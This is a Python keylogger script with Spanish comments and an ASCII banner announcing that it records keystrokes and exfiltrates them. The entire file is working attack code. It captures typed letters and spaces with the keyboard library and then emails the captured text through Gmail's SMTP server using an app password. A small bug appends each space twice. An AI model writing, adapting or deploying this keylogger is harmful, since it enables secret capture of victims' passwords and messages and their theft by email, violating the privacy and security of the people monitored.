


# 0.Importo las librerias de Python necesarias

from colorama import Fore, Back, init
import keyboard
import time
import smtplib
from email.mime.text import MIMEText
import time




# 1.Imprimo el título en pantalla

print(Fore.GREEN)

print(r"""
  _  _________   ___     ___   ____  ____ _____ ____  
 | |/ / ____\ \ / / |   / _ \ / ___|/ ___| ____|  _ \ 
 | ' /|  _|  \ V /| |  | | | | |  _| |  _|  _| | |_) |
 | . \| |___  | | | |__| |_| | |_| | |_| | |___|  _ < 
 |_|\_\_____| |_| |_____\___/ \____|\____|_____|_| \_\

Este programa realiza 3 pasos:
1.Importa las librerias necesarias.
2.Registra las pulsaciones de teclado (el usuario puede configurar cuantas pulsaciones en total quiere registrar).
3.Exfiltra los datos y los envia a un correo electrónico que configura el usuario.

""")





# 2.Registro las pulsaciones de teclado

# Creo una variable contenedor, esta variable va a almacenar cada tecla que el usuario pulse en su teclado
pulsaciones_registradas = ""

# Creo una variable contador que usaré en el bucle while para llevar la cuenta de cuantas teclas se han pulsado en cada loop.
contador_pulsaciones = 0

# Le pregunto al usuario cuantas pulsaciones quiere escuchar
print("")
pulsaciones_maximas = int(input("Introduce la cantidad máxima de pulsaciones que quieres registrar --> "))

#Creo el bucle while para registrar las teclas presionadas, dura mientras no se supere el umbral permitido
while contador_pulsaciones < pulsaciones_maximas:
    # Uso la funcion keyboard.read_key() para ponerme a la escucha todas 
    tecla = keyboard.read_key()
    # Defino todas las teclas del abecedario definidas en la lista
    if tecla in ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "space"]:
        # Transformo el espacio a su formato adecuado
        if tecla == "space":
            tecla = " "
            # Añado la tecla pulsada a la variable contenedor
            pulsaciones_registradas = pulsaciones_registradas + tecla
            print(f"Pulsación {contador_pulsaciones} --> {tecla}")
        pulsaciones_registradas = pulsaciones_registradas + tecla
        # El contador sube por cada ciclo
        contador_pulsaciones = contador_pulsaciones + 1
        print(f"Pulsación {contador_pulsaciones} --> {tecla}")
        # El sleep regula y precisa el procesamiento de teclas registradas para mejorar la eficiencia
        time.sleep(0.15)
print("")
# Imprimo el resultado de la informacion guardada
print("Resultado:")
print(pulsaciones_registradas)




# 3.Exfiltro los registros por correo electronico

# Pido al usuario que introduzca sus datos email
print("")
emisor = input("Introduce tu correo electrónico emisor (Dirección desde la que quieres enviar las pulsaciones registradas)--> ")
receptor = input("Introduce tu correo electrónico receptor (Dirección a la que quieres enviar las pulsaciones registradas) --> ")
contraseña_aplicacion = input("Introduce la contraseña de aplicación de tu correo electrónico emisor (https://myaccount.google.com/apppasswords) --> ")

# Configuro el mensaje para enviarlo
msg = MIMEText(pulsaciones_registradas)
msg["Subject"] = "Teclas capturadas"
msg["From"] = emisor
msg["To"] = receptor

# Conexión y envío mediante SSL (Puerto 465)
with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
    # Uso las credenciales proporcionadas por el usuario
    server.login(emisor, contraseña_aplicacion)
    # Envio el mensaje
    server.sendmail(emisor, receptor, msg.as_string())

# Imprimo el mensaje final y le aviso al usuario que revise su email
print("")
print("Enviando correo...")
time.sleep(3)
print("")
print("Mensaje enviado correctamente. Revisa tu correo electrónico.")
print("")




